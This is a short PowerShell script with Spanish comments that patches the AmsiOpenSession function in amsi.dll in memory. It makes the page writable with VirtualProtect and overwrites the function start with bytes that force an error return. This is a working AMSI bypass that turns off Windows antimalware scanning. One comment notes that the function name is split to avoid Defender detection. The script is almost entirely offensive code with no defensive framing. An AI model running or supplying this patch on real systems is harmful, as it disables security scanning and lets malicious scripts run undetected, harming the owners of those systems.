$bypass = @"
using System;
using System.Runtime.InteropServices;


public class Class {
	
	[DllImport("kernel32")]
	public static extern IntPtr LoadLibrary(string name);
	
	[DllImport("kernel32")]
	public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
	
	[DllImport("kernel32")]
	public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out int lpflOldProtect);
}
"@
Add-Type $bypass  #definimos la clase .NET
$parche64 = [Byte[]](0xb8,0x57,0x00,0x07,0x80,0xc3)  #Código ensamblador que se va a inyectar. Solo funcional para x64
Write-Output "[+] Parche $parche64"
Write-Output "[+]Bytes a inyectar al principio de opensession"
Write-Output "[+]08 57 00 07 80          mov     eax, 80070057h
C3                      retn"
$asd = [Class]::LoadLibrary("amsi.dll") #Cargamos amsi
$punterofuncion = [Class]::GetProcAddress($asd, "Ams"+"iOpenS"+"ession") #Cargamos el puntero. Apartado que suele generar detecciones del Defender.
$a=$punterofuncion.ToInt64()
$punterofuncion = [IntPtr] $a
$oldProtect = 0

Write-Output "[+] Cambiando permisos de paginacion de amsi.dll a RWX..."
[Class]::VirtualProtect($punterofuncion, [uint32]$parche64.Length, 0x40, [ref] $oldProtect)  
Write-Output "[+] Parchenado amsiopensession"
[System.Runtime.InteropServices.Marshal]::Copy($parche64, 0, $punterofuncion, $parche64.Length)
Write-Output "[+] Devolviendo permisos de paginacion de amsi.dll a RX..."
[Class]::VirtualProtect($punterofuncion, [uint32]$parche64.Length, 0, [ref] $null)
